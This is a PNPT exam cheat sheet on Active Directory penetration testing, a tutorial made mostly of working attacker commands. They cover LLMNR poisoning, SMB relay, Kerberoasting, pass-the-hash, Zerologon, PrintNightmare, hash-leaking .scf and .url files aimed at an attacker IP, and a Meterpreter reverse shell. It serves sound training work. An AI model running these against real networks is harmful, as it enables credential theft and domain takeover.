This is an Active Directory attack techniques cheat sheet for the PNPT (Practical Network Penetration Tester) certification by TCM Security.

The techniques are organized step-by-step, following the actual exam and real-world penetration testing workflow.

### [AD Attack Flow]

Active Directory attacks generally follow the flow below:

```bash
[Entry into external/internal network]

Phase 1. Pre-Compromise
  Capture hashes/credentials from the network without any prior credentials
  (LLMNR Poisoning, SMB Relay, IPv6 Takeover ...)

[Obtain user account or hash]

Phase 2. Post-Compromise Enumeration
  Map internal AD structure / identify attack paths
  (BloodHound, PowerView, ldapdomaindump ...)

[Identify attack targets / paths]

Phase 3. Post-Compromise Attack
  Privilege escalation / lateral movement
  (Kerberoasting, Pass-the-Hash, Token Impersonation ...)

[Secure high-privilege account or DA rights]

Phase 4. Domain Compromise
  Full takeover of the Domain Controller
  (DCSync, Golden Ticket, NTDS.dit dump ...)

Phase 5. Post-Exploitation & Persistence
  Maintain access / lateral movement / cover tracks
  (Mimikatz, Evil-WinRM, Pivoting ...)
```

Most AD attacks rely on credentials or information gathered in earlier phases, so thorough documentation at each step is critical.

### [Phase 1: Pre-Compromise]

The goal of the Pre-Compromise phase is to steal a user's hash or credentials while connected to the network without any prior credentials.

### [1-1: LLMNR / NBT-NS Poisoning]

LLMNR and NBT-NS are protocols Windows uses to broadcast queries to the local network when DNS fails to resolve a hostname. An attacker can reply to these broadcasts with a false response, capturing the authentication hash that the victim automatically sends when attempting to connect — making credential theft possible.

**Requirements:**

```bash
- Must be on the same network (LAN)
- Victim must attempt to access a non-existent hostname (e.g., a typo when accessing a file share)
- LLMNR or NBT-NS must be enabled (Windows default: enabled)
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Victim tries to access \\FIILESRV (typo)
2. DNS lookup fails
3. LLMNR broadcast is sent
4. Attacker's Responder replies to "FIILESRV"
5. Victim sends NTLMv2 hash (must crack the NTLMv2 hash to obtain credentials)
6. Hash captured successfully

---------------------------------------------------------------------

(Tools & Commands)

# Run Responder (basic)
sudo responder -I eth0 -dwv

# Option descriptions
# -I eth0  : specify network interface
# -d       : DHCP poisoning
# -w       : enable WPAD proxy server
# -v       : verbose output

# Analysis mode (listen only, no responses)
sudo responder -I eth0 -A
```

※ Hashes captured by Responder are saved to /usr/share/responder/logs/

※ Captured NTLMv2 hashes cannot be used directly for PASS-THE-HASH — you must either crack them for plaintext passwords or relay them via SMB Relay.

### [1-2: SMB Relay Attack]

SMB Relay attacks relay the NTLMv2 hash captured via LLMNR Poisoning to another machine in real-time for authentication, rather than cracking it directly. Since the challenge value changes every time, the relay must happen in real-time — essentially a Man-in-the-Middle attack.

**Requirements:**

```bash
- At least one machine must have SMB Signing disabled or set to Not Required
- The captured user must have local admin rights on the relay target machine
- LLMNR/NBT-NS must be enabled

SMB Signing = server-side packet integrity verification
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Modify Responder config (disable SMB/HTTP responses)
2. Run ntlmrelayx.py (specify relay target)
3. Run Responder (for hash capture)
4. Victim sends LLMNR request
5. Responder replies → victim sends hash
6. ntlmrelayx.py relays hash to target machine
7. SAM dump or shell obtained on target

--------------------------------------------------------------------------------------------------

(Tools & Commands)

1 - Modify Responder config
# SMB = Off
# HTTP = Off
# (ntlmrelayx handles these instead, so disable in Responder)
sudo nano /etc/responder/Responder.conf

2 - Build target list
# Find machines with SMB Signing disabled and save to file
nmap --script=smb2-security-mode.nse -p 445 192.168.1.0/24 | grep -B5 "not required" | grep "Nmap scan report" | awk '{print $NF}' > targets.txt

Step 3 - Run ntlmrelayx.py
# SAM dump mode = dump all account hashes from target server
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell mode = get an interactive shell on target server
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Command execution mode = run commands directly on target server
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

4 - Run Responder
sudo responder -I eth0 -dwv
```

※ Hashes from SAM dump are NT hashes, which can be used for PASS-THE-HASH.

### [1-3: IPv6 DNS Takeover (mitm6)]

Windows enables IPv6 by default and prioritizes it over IPv4. An attacker can pose as a fake DHCPv6 server to register themselves as the default DNS server for the network, then use LDAP relay to create a domain admin account and take over the DC.

**Requirements:**

```bash
1. IPv6 must be enabled on the network (Windows default)
2. LDAP Signing must not be required
3. DC must lack LDAPS (port 636) or have a weak configuration
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Run mitm6
2. Victim machine sets attacker as IPv6 DNS = DNS hijacked via fake DHCPv6 server
3. Victim queries WPAD etc. and connects to attacker
4. ntlmrelayx.py relays credentials to DC's LDAP
5. New admin account created or ACL modified (ACL = access control list for account permissions)

-------------------------------------------------------------------------

(Tools & Commands)

Terminal 1 - ntlmrelayx.py
# Create a domain admin account
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] -wh fakewpad.domain.local -l loot
# AD CS target = issue domain admin certificate
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] --delegate-access

Terminal 2 - Run mitm6
sudo mitm6 -d domain.local
```

### [1-4: Password Spraying]

Password Spraying tries a single password against many accounts to avoid triggering account lockout policies.

**Requirements:**

```bash
1. Must have a list of valid usernames
2. Must verify password policy (stay below lockout threshold)
3. Must know common passwords (Season+Year, company name, Password1!, etc.)
```

**Tools & Commands:**

```bash
(Attack Flow)

1. Check password policy (identify lockout threshold)
2. Collect username list (Kerbrute, enum4linux, etc.)
3. Select one common password (e.g., Password2024!)
4. Try the same password against all users
5. Successful accounts → begin internal enumeration

------------------------------------------------------------------------------------

(Username Collection)

# Kerbrute username enumeration (no credentials needed)
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt

# enum4linux
enum4linux -U [DC-IP]

# LDAP = company directory management system (when credentials are available)
crackmapexec smb [DC-IP] -u '' -p '' --users

---------------------------------------------------------------------------------------

(Check Password Policy)

crackmapexec smb [DC-IP] -u [user] -p [pass] --pass-pol

-------------------------------------------------------------------------------------

(Run Spray)

# Kerbrute (Kerberos-based, fast)
kerbrute passwordspray -d domain.local --dc [DC-IP] usernames.txt "Password2024!"

# CrackMapExec
crackmapexec smb [DC-IP] -u usernames.txt -p "Password2024!" --continue-on-success
```

### [1-5: WPAD Attack]

Uses Responder's WPAD feature to set up a fake proxy server that tricks victims' browsers into automatically authenticating.

**Requirements:**

```bash
1. LLMNR/NBT-NS enabled
2. Victim starts using a web browser
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Run Responder with -w -F flags
2. Victim's browser auto-discovers WPAD proxy settings
3. "WPAD" query broadcast via LLMNR
4. Responder replies to "WPAD" query
5. Browser prompts for proxy auth (-F: force Basic auth)
6. Cleartext credentials obtained

---------------------------------------------------------------

(Commands)

# -w : enable WPAD server
# -F : force Basic auth (allows cleartext credential capture)
sudo responder -I eth0 -wFv
```

###

### [Phase 2: Post-Compromise Enumeration]

Phase 2 focuses on mapping the internal AD structure and planning attack paths.

### [2-1: BloodHound / SharpHound]

BloodHound and SharpHound collect all AD relationships (users, groups, computers, ACLs, GPOs, etc.) and visualize them as a graph.

**Requirements:**

```bash
1. Must have valid domain credentials
2. Must have internal domain access
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain domain user credentials (result from Phase 1)
2. Collect all AD data with SharpHound (ZIP output)
3. Transfer ZIP to Kali and import into BloodHound GUI
4. Run "Shortest Path to DA" query
5. Identify attack path → choose Phase 3 attack

----------------------------------------------------------------

(Data Collection via SharpHound)

# Run on Windows victim machine
.\SharpHound.exe -c All --domain domain.local --zipfilename bloodhound.zip

# PowerShell version
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip

# Remote execution from Kali (when credentials are available)
bloodhound-python -u [user] -p [pass] -ns [DC-IP] -d domain.local -c All --zip

-----------------------------------------------------------------------------

BloodHound GUI Analysis

Start Neo4j: sudo neo4j start
Launch BloodHound and import the ZIP file
Key queries:

"Find Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"List all Kerberoastable Accounts"
"Find Computers where Domain Users are Local Admin"
```

### [2-2: PowerView]

PowerView is a PowerShell-based AD tool that offers more granular object and permission analysis than BloodHound.

**Requirements:**

```bash
1. Domain user privileges
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access Windows machine with domain user account
2. Load PowerView.ps1 (. .\PowerView.ps1)
3. Enumerate all domain users/groups/computers
4. Find accounts with SPNs → identify Kerberoasting targets
5. Find accounts with pre-auth disabled → identify AS-REP Roasting targets
6. Find-LocalAdminAccess → get list of machines where you are local admin
7. Analyze ACLs → find misconfigured permissions → plan privilege escalation
   (misconfigured = accounts with unnecessarily excessive permissions set)

--------------------------------------------------------------------------------------------

(Key Commands)

# Load module
. .\PowerView.ps1

# Basic domain info
Get-NetDomain
Get-DomainSID

# User enumeration
Get-DomainUser
Get-DomainUser -Identity [username] -Properties *

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -Properties Name,IPv4Address

# Find machines where you are local admin
Find-LocalAdminAccess

# Accounts with SPNs (Kerberoasting targets)
Get-DomainUser -SPN

# Accounts with Kerberos pre-auth disabled (AS-REP Roasting targets)
Get-DomainUser -PreauthNotRequired

# ACL analysis
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}

# Share discovery
Invoke-ShareFinder
```

### [2-3: ldapdomaindump]

ldapdomaindump is a Python tool that directly queries AD over the LDAP protocol to scrape information.

**Requirements:**

```bash
1. Valid domain credentials
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain domain credentials
2. Run ldapdomaindump → generates HTML/JSON files
3. domain_users.html → check user list, admin accounts, description fields
4. domain_groups.html → check DA group members
5. domain_policy.html → check password policy (identify lockout threshold before spraying)
6. Use collected info → select targets for next attack phase

------------------------------------------------------------------------------------

(Commands)

ldapdomaindump [DC-IP] -u 'domain.local\[user]' -p '[password]' -o ./loot/

# Output files:
# domain_users.html     → all user info
# domain_groups.html    → group info
# domain_computers.html → computer list
# domain_policy.html    → password policy
```

### [2-4: CrackMapExec (CME / NetExec)]

CME and NetExec are tools that can scan entire networks using various protocols (SMB, WinRM, LDAP, RDP), test credentials, gather information, and execute commands all in one.

**Requirements:**

```bash
1. Valid credentials or hash
2. Target port must be accessible
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain credentials or hash
2. Test credentials across the entire network range
3. Machines showing (Pwn3d!) = local admin access available
   ([+] = login succeeded only / (Pwn3d!) = local admin rights confirmed)
4. Dump hashes from those machines with --sam / --lsa
5. Re-test the dumped hashes across the entire network (Pass-the-Hash)
6. Discover additional Pwn3d! machines → repeat (hash chaining)
7. Once DA hash obtained → access DC

-------------------------------------------------------------------------

(Key Commands)

# Validate credentials
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] -d domain.local

# Check local admin access (look for Pwn3d!)
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --local-auth

# SAM dump
crackmapexec smb [IP] -u [user] -p [pass] --sam

# LSA Secrets dump
crackmapexec smb [IP] -u [user] -p [pass] --lsa

# Pass-the-Hash (no plaintext password needed)
crackmapexec smb 192.168.1.0/24 -u [user] -H [NTLM-hash] --local-auth

# Check active sessions
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --sessions

# Share enumeration
crackmapexec smb [IP] -u [user] -p [pass] --shares

# Execute command via WinRM
crackmapexec winrm [IP] -u [user] -p [pass] -x 'whoami'
```

### [2-5: enum4linux / rpcclient]

Tools that help enumerate users, groups, and password policies via SMB null sessions or valid credentials.

**Requirements:**

```bash
SMB null session allowed (no credentials) OR valid credentials
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access DC with or without credentials
2. Run enum4linux -a to collect all info at once
3. User list → use for Password Spraying or Kerberoasting
4. Password policy → identify lockout threshold (critical before spraying)
5. Group info → identify DA group members
6. Share list → check accessible shares

------------------------------------------------------------

(Commands)

# enum4linux
enum4linux -a [IP]
enum4linux -U [IP]  # users only
enum4linux -P [IP]  # password policy only

# rpcclient (no credentials)
rpcclient -U "" -N [IP]
> enumdomusers      # enumerate users
> enumdomgroups     # enumerate groups
> getdompwinfo      # password policy

# rpcclient (with credentials)
rpcclient -U "domain.local\[user]%[pass]" [IP]
```

### [2-6: Kerbrute (Username Enumeration)]

Kerbrute uses the Kerberos protocol to identify valid usernames without triggering account lockouts.

**Requirements:**

```bash
1. Kerberos port (88) must be accessible on the DC
2. Must have a username wordlist
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Prepare username wordlist (common names, company naming patterns, etc.)
2. Run Kerbrute userenum to filter only valid usernames
3. No account lockout triggered (leverages Kerberos AS-REQ error codes)
4. Obtain list of valid usernames
5. Use for Password Spraying or AS-REP Roasting

-------------------------------------------------------------------------

(Commands)

# Username enumeration
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt -o valid_users.txt

# Password spray
kerbrute passwordspray -d domain.local --dc [DC-IP] valid_users.txt "Password1"
```

### [2-7: GPO/SYSVOL Enumeration]

The SYSVOL share is readable by all authenticated domain users, and may contain encrypted passwords left over from old GPP configurations.

※ GPP = Group Policy Preferences, used by admins to deploy settings to all domain machines. When accounts were created via GPP with passwords included, those settings were sometimes saved as XML files in SYSVOL — making them a potential vulnerability.

**Requirements:**

```bash
1. Valid domain user credentials
2. Environment where GPP passwords were configured in the past
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access SYSVOL with domain user account (readable by all authenticated users)
2. Browse SYSVOL\[domain]\Policies subdirectories for Groups.xml files
3. Find cPassword field
4. Decrypt using gpp-decrypt or CrackMapExec gpp_password module
5. Obtain plaintext password (often a local admin or DA account)
6. Use the account for further attacks

------------------------------------------------------------------

(Commands)

# From Kali
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# From PowerView
Get-GPPPassword

# Manual enumeration
smbclient //[DC-IP]/SYSVOL -U [user]
# Find Groups.xml files
find . -name "Groups.xml" 2>/dev/null

# Decrypt cPassword
gpp-decrypt [cPassword value]
```

### [Phase 3: Post-Compromise Attack]

The goal of Phase 3 is to escalate from a standard user account to higher privileges, approaching Domain Admin level.

### [3-1: Kerberoasting]

Kerberoasting requests TGS tickets for service accounts with SPNs (Service Principal Names), then cracks the encrypted portion offline to obtain the service account password.

1. Only service accounts can have SPNs assigned
2. Any domain user can request a TGT
3. With a TGT, TGS tickets can be requested for SPN-enabled accounts
4. TGS tickets are encrypted with the service account's password hash → crackable offline

※ TGT (Ticket Granting Ticket) = a ticket issued at login in the Kerberos authentication system, used to prove identity when accessing services within the domain.

**Requirements:**

```bash
1. Domain user credentials (low privilege is fine)
2. At least one service account with an SPN configured
3. Most effective when the service account has a weak password
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Log in with a domain user account
2. Find service accounts with SPNs (GetUserSPNs, BloodHound)
3. Request TGS ticket for the service account (legitimate Kerberos request)
4. Extract TGS ticket (contains portion encrypted with service account hash)
5. Crack offline with Hashcat
6. Obtain plaintext password of the service account
7. Use the account for further attacks, or take over domain if it's a DA account

-------------------------------------------------------------------------------------------

(Find Target Accounts)

# From Kali (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP]

# From PowerView
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName

# BloodHound (GUI)
Queries tab → click "List all Kerberoastable Accounts"
→ Visualizes list of SPN-configured accounts

------------------------------------------------------------------------------------------

(Run Attack)

# Extract hashes (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request -outputfile kerberoast.txt

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

------------------------------------------------------------------------------------------------

(Crack Hashes)

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# -m 13100 = Kerberos 5 TGS-REP etype 23

john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### [3-2: AS-REP Roasting]

AS-REP Roasting allows requesting a partial TGT without a valid password for accounts that have Kerberos pre-authentication disabled.

**Requirements:**

```bash
1. At least one account with "Do not require Kerberos preauthentication" enabled
2. Attack works without credentials, but having credentials enables finding more targets
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Find accounts with pre-auth disabled (PowerView, BloodHound)
2. Send AS-REQ for those accounts without authentication
3. KDC returns part of the TGT encrypted with the account's hash (AS-REP)
4. Extract the encrypted portion
5. Crack offline with Hashcat (-m 18200)
6. Obtain account password

------------------------------------------------------------------------

(Find Targets)

# Impacket (no credentials)
GetNPUsers.py domain.local/ -no-pass -usersfile usernames.txt -dc-ip [DC-IP]

# Impacket (with credentials)
GetNPUsers.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request

# PowerView
Get-DomainUser -PreauthNotRequired

-------------------------------------------------------------------------------

(Crack Hashes)

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 18200 = Kerberos 5 AS-REP etype 23
```

### [3-3: Pass-the-Hash (PtH)]

PtH attacks authenticate using an NTLM hash without needing the plaintext password (e.g., from SAM dumps or Mimikatz).

※ NTLMv2 hashes captured by Responder cannot be used here.

**Requirements:**

```bash
1. Must have an NTLM hash (NTLMv2 hashes do NOT work, only NTLM hashes)
2. SMB/WinRM must be open on the target
3. The account must be a local admin or domain admin on the target
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain NTLM hash via SAM dump or Mimikatz
2. Pass the hash directly into CrackMapExec / psexec.py
3. Target accepts NTLM authentication
4. Shell or command execution access obtained
5. Dump additional hashes or move laterally

---------------------------------------------------------

(Run Attack)

# CrackMapExec
crackmapexec smb [IP] -u [user] -H [NTLM-hash] --local-auth

# psexec.py (Impacket)
psexec.py [user]@[IP] -hashes :[NTLM-hash]

# wmiexec.py (Impacket)
wmiexec.py [user]@[IP] -hashes :[NTLM-hash]

# evil-winrm (WinRM)
evil-winrm -i [IP] -u [user] -H [NTLM-hash]

# Hash format: -hashes [LM-hash]:[NT-hash]
# If no LM hash, leave it blank with colon: :[NT-hash]
```

### [3-4: Pass-the-Ticket (PtT)]

PtT extracts Kerberos tickets (TGS or TGT) from memory and reuses them to authenticate against other systems.

**Requirements:**

```bash
1. Another user must have an active session on the system
   # Tickets only exist in memory while the user is logged in — they disappear on logout
   # The target user must currently be logged into that machine

2. SYSTEM or administrator privileges required (for memory access)
   # Tickets are stored in lsass process memory
   # lsass is a core Windows process — not accessible to regular users
   # SYSTEM or admin rights are required
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain admin or SYSTEM privileges
2. Use klist to check cached Kerberos tickets on the system
3. Extract tickets from memory using Mimikatz / Rubeus (.kirbi files)
4. Inject the stolen ticket into the current session (kerberos::ptt)
5. Access network resources using the injected ticket's privileges

-----------------------------------------------------------------

(Run Attack)

# Extract tickets with Mimikatz (Windows)
1. Run mimikatz.exe
2. privilege::debug           (elevate privileges)
3. sekurlsa::tickets /export  (extract tickets + save as .kirbi files)
4. kerberos::ptt [filename.kirbi]  (inject ticket)
5. klist                      (verify injection)

# Extract with Rubeus
.\Rubeus.exe dump /nowrap

# Inject ticket (Mimikatz)
mimikatz # kerberos::ptt [ticket.kirbi]

# Inject with Rubeus
.\Rubeus.exe ptt /ticket:[base64-ticket]

# Verify injection
klist
```

###

### [3-5: Overpass-the-Hash (OPtH)]

OPtH uses an NTLM hash to obtain a TGT via Kerberos authentication, rather than using it for NTLM-based auth.

Mid-point check:

```bash
PtH vs OPtH

Both PtH and OPtH use NTLM hashes, but PtH uses NTLM authentication while OPtH uses
Kerberos — making OPtH significantly more versatile than PtH.
However, when you only have local account credentials (not domain) or port 88 (Kerberos)
is blocked, PtH is the only option.
```

**Requirements:**

```bash
1. Must have an NTLM hash
2. Must be in a Kerberos-enabled environment
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain NTLM hash (via SAM dump, Mimikatz, etc.)
2. Use NTLM hash as RC4 key to request a TGT from the KDC
3. KDC issues a legitimate TGT (passes if hash is correct)
4. Use the TGT for Kerberos-based authentication
5. Access domain services (works even in environments where NTLM is blocked)

-----------------------------------------------------------

(Run Attack)

# Mimikatz
1. Run mimikatz.exe
2. privilege::debug
3. sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[hash] /run:cmd.exe

# Rubeus
.\Rubeus.exe asktgt /user:[user] /rc4:[NTLM-hash] /ptt
```

###

### [3-6: Token Impersonation]

Windows assigns tokens to running processes, and it's possible to operate with another user's privileges by using their token. This attack steals the token from an active DA session to gain Domain Admin privileges.

**Requirements:**

```bash
1. Must have local admin or SYSTEM privileges
2. Target user must have an active session or process on the system
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access machine with local admin or SYSTEM privileges
2. Run list_tokens -u to view available tokens on the system
3. Find a DA or high-privilege account token
4. Use impersonate_token to steal that token
5. whoami → now operating with DA privileges
6. Access DC or proceed with further attacks

---------------------------------------------------------------

(Run Attack)

1. msfconsole
2. use exploit/windows/smb/psexec
3. set payload windows/x64/meterpreter/reverse_tcp
4. set RHOSTS [IP]
5. set SMBUser [user]
6. set SMBPass [pass]
7. run

# In Meterpreter:
load incognito
list_tokens -u                           # view available tokens
impersonate_token "DOMAIN\\Administrator"  # steal token
shell
whoami
```

### [3-7: GPP / cPassword Attack (MS14-025)]

※ Second reference

Old Group Policy Preferences (GPP) was a feature that allowed admins to deploy local account passwords, service accounts, and drive mappings across all domain machines. Passwords were encrypted with AES-256 and stored in SYSVOL, but in 2012 Microsoft accidentally published the encryption key in MSDN — making decryption trivial for anyone. Microsoft patched this with MS14-025 in 2014, blocking new password storage via GPP, but files created before the patch may still exist in SYSVOL.

**AES Decryption Key:**

```bash
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

**Requirements:**

```bash
1. Domain user credentials (SYSVOL is readable by all authenticated users)
2. Must be an old environment or one where GPP passwords were configured historically
3. GPP files created before MS14-025 must still be present
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Access SYSVOL with a domain user account (readable by all authenticated users)
2. Search all subdirectories under \\[DC]\SYSVOL\[domain]\Policies
3. Find cPassword field in Groups.xml, Services.xml, etc.
4. Copy the cPassword value
5. Decrypt with gpp-decrypt (uses the AES key Microsoft leaked)
6. Obtain plaintext password
7. Usually the local Administrator account
8. Spread across the network via Pass-the-Password or Pass-the-Hash

------------------------------------------------------------------------

(Run Attack)

# CrackMapExec automation (fastest)
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# Metasploit
use post/windows/gather/credentials/gpp

# Manual - browse SYSVOL via smbclient
smbclient //[DC-IP]/SYSVOL -U [user]%[pass]
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
1. Download everything locally, then search:
grep -r "cpassword" .
2. Decrypt with gpp-decrypt:
gpp-decrypt [cPassword value]
3. PowerView (on Windows):
Get-GPPPassword
4. Find only specific files:
find /tmp/sysvol -name "*.xml" | xargs grep -l "cpassword" 2>/dev/null

-------------------------------------------------------------------------------

(Post-Exploitation)

# Usually a local admin password → spread across network
crackmapexec smb 192.168.1.0/24 -u Administrator -p [decrypted password] --local-auth

# Machines showing Pwn3d! → SAM dump → harvest more hashes
crackmapexec smb [IP] -u Administrator -p [pass] --local-auth --sam
```

### [3-8: URL File / SCF File Attack (Watering Hole)]

Places a malicious .url or .scf file in a network share so that when a user simply opens the folder in File Explorer, their NTLM hash is automatically sent to Responder.

**Requirements:**

```bash
1. A network share where write access is available
2. Users actively browse that share
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Run Responder (waiting to receive hashes)
2. Find writable network shares (CrackMapExec --shares)
3. Drop @exploit.scf or @exploit.url file into the share
4. When a user opens the folder in File Explorer, it auto-triggers
5. File requests an icon/resource from attacker's IP
6. NTLMv2 hash is automatically sent
7. Responder captures the hash

--------------------------------------------------------------------------

(Create Malicious Files)

# .scf file (desktop icon file)
cat > @exploit.scf << EOF
[Shell]
Command=2
IconFile=\\[ATTACKER-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# .url file
cat > @exploit.url << EOF
[InternetShortcut]
URL=file://[ATTACKER-IP]/share
EOF

----------------------------------------------------------------------------

(Place in Share)

# Find writable shares with CrackMapExec
crackmapexec smb [TARGET] -u [user] -p [pass] --shares

# NetExec slinky for automation (create + deploy in one step)
netexec smb [TARGET-IPs] -u [user] -p [pass] -M slinky -o SERVER=[ATTACKER-IP] NAME=@exploit

---------------------------------------------------------------------------------

(Wait with Responder)

sudo responder -I eth0 -v
```

### [3-9: PrintNightmare (CVE-2021-34527)]

A vulnerability in the Windows Print Spooler service that allows remote loading of a malicious DLL to gain SYSTEM privileges.

**Requirements:**

```bash
1. Domain user credentials
2. Target machine must be unpatched (pre-July 2021)
3. Print Spooler service must be running
```

**Attack Flow + Tools & Commands:**

```bash
1. Find vulnerable machines (check if Print Spooler is running)
2. Prepare malicious DLL (reverse shell or add local admin account)
3. Host DLL on an SMB share from Kali
4. Run exploit → target loads DLL from attacker's SMB share
5. DLL executes with SYSTEM privileges
6. Reverse shell or new admin account created

------------------------------------------------------------------

# Check for vulnerability
crackmapexec smb [IP] -u [user] -p [pass] -M printnightmare

# cube0x0 exploit
# https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'

# Impacket-based
python3 printnightmare.py domain.local/[user]:[pass]@[IP] '\\[ATTACKER-IP]\share\evil.dll'
```

### [3-10: Zerologon (CVE-2020-1472)]

A cryptographic flaw in the Netlogon protocol that allows resetting a DC's machine account password to blank without any authentication — enabling instant domain takeover.

**How it works:**

```bash
1. Attacker sends Netlogon packets with IV set to zero
2. Due to AES-CFB8 behavior, roughly 1 in 256 encryptions with all-zero IV produce all-zero output
3. Repeat approximately 256 times on average
4. When encrypted output is all-zero, DC decrypts it as a blank password
5. DC accepts authentication with the blank password
6. DC machine account password is reset to blank
7. Attacker logs into DC with empty password → domain taken over
```

**Requirements:**

```bash
1. Network access to the DC
   # ping [DC-IP] is reachable
   # Port 445 is open
2. DC must be unpatched (pre-August 2020)
3. Warning: Can damage the DC in production environments — use with caution
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Identify DC IP
2. Test for Zerologon vulnerability (zerologon_tester.py)
3. If vulnerable → reset DC machine account password to blank
4. Authenticate to DC machine account with empty password
5. Dump all hashes with secretsdump.py
6. Use DA hash to take over the domain
7. Must restore original DC password (failure to do so will break the DC)

-----------------------------------------------------------------------

(Run Attack)

# Check vulnerability
python3 zerologon_tester.py [DC-NETBIOS-NAME] [DC-IP]

# Exploit (reset DC password to blank)
python3 cve-2020-1472-exploit.py [DC-NETBIOS-NAME] [DC-IP]

# Dump hashes with secretsdump.py
secretsdump.py -no-pass -just-dc [domain]/[DC-NETBIOS-NAME]$@[DC-IP]

# Restore original password (mandatory!)
python3 restorepassword.py [domain]/[DC-NETBIOS-NAME]@[DC-IP] -target-ip [DC-IP] -hexpass [original hex password]
```

### [3-11: ACL / ACE Abuse]

AD objects (users, groups, computers) have Access Control Lists (ACLs). Misconfigured permissions such as GenericWrite, WriteDACL, or WriteOwner can be abused to take over accounts or escalate privileges.

**Key Dangerous Permissions:**

```bash
1. GenericAll          - Change target account password, set SPN
2. GenericWrite        - Set SPN (enables Kerberoasting), modify login scripts
3. WriteDACL           - Grant yourself DCSync rights
4. WriteOwner          - Change owner then gain full control
5. ForceChangePassword - Force-reset another user's password
```

**Requirements:**

```bash
1. Domain user credentials
2. BloodHound or PowerView available to identify misconfigured ACLs
3. Your account must have a dangerous permission on the target object
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Identify misconfigured ACLs with BloodHound
2. Confirm your account has GenericAll/GenericWrite/etc. on the target
3. Choose attack method based on permission:
4. GenericWrite → set SPN → Kerberoast
5. WriteDACL → grant yourself DCSync rights → run DCSync
6. ForceChangePassword → force-reset target's password
7. WriteOwner → change owner → gain GenericAll → proceed
8. Use elevated privileges for further attacks

-------------------------------------------------------------------

(Enumerate & Exploit)

# Visualize with BloodHound

# Check ACLs for a specific account with PowerView
Get-ObjectAcl -Identity [user] -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL"}

# Set SPN via GenericWrite → Kerberoasting
Set-DomainObject -Identity [target-user] -Set @{serviceprincipalname='fake/spn'}
# Then run Kerberoasting

# Abuse ForceChangePassword (PowerView)
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity [target-user] -AccountPassword $SecPassword -Verbose
```

### [3-12: Kerberos Delegation Abuse]

Delegation allows a service to access other services on behalf of a user. Misconfigured delegation settings can be abused for privilege escalation.

**Requirements:**

```bash
1. Domain user credentials
2. Unconstrained: must have local admin access on the Delegation-configured machine
3. RBCD: must have GenericWrite or higher on the target computer object
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow 1 - Unconstrained)

1. Find machines with Unconstrained Delegation (BloodHound or PowerView)
2. Gain local admin access on that machine
3. Wait for TGT capture with Rubeus monitor
4. Force the DC to connect to that machine via PrinterBug/SpoolSample
5. DC's TGT gets cached in memory
6. Extract TGT → chain into DCSync or Golden Ticket

(Attack 1 - Unconstrained Delegation)

# Find targets (can delegate to any service = most dangerous)
Get-DomainComputer -Unconstrained

# Force DC to connect (PrinterBug/SpoolSample)
# → DC's TGT is cached in memory → steal it
.\Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe [DC-IP] [ATTACKER-IP]

--------------------------------------------------------------------------

